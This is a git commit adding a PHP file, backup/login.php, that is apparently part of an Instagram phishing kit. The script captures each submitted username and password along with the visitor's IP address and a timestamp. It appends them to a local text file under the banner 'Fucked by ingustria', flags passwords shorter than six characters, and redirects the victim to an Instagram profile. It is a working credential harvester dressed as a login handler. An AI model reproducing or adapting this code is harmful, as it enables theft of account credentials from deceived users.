f1e3d202e765d62ed3ace2dc8721910dffeb968d
seturya <103839781+seturya@users.noreply.github.com>
2022-04-27 11:59:39 +0200

    Add files via upload

---
+++ backup/login.php
@@ -0,0 +1,37 @@
+<?php
+
+	date_default_timezone_set('Europe/Paris');
+	$date = date("d-n-Y");
+	$time = date("H:i:s");
+
+	$ip = $_SERVER['REMOTE_ADDR'];
+	$hostname = gethostbyaddr($ip);
+
+	$message .= "
+
+========== Fucked by ingustria ==========\n";
+	$message .= "User: ".$_POST['username']."\n";
+
+	if (strlen($_POST['username']) <= 0 or strlen($_POST['password']) < 6){
+		$message .= "Pass: ".$_POST['password']." (/!\ BAD PASSWORD : Pass less than 6 characters)\n";
+	}
+	else{
+		$message .= "Pass: ".$_POST['password']."\n";
+	}
+
+	$message .= "--------------------\n";
+	$message .= "IP  : ".$ip."\n";
+	$message .= "Log : ".$time." / ".$date."\n \n";
+
+	$file = fopen("ingustria.txt", "ab");
+	fwrite($file, $message);
+	fclose($file);
+
+	if (strlen($_POST['username']) <= 0 or strlen($_POST['password']) < 6){
+		header("Location: index.php");
+	}
+	
+	else{
+		header("Location: https://www.instagram.com/ingustria");
+	}
+?>
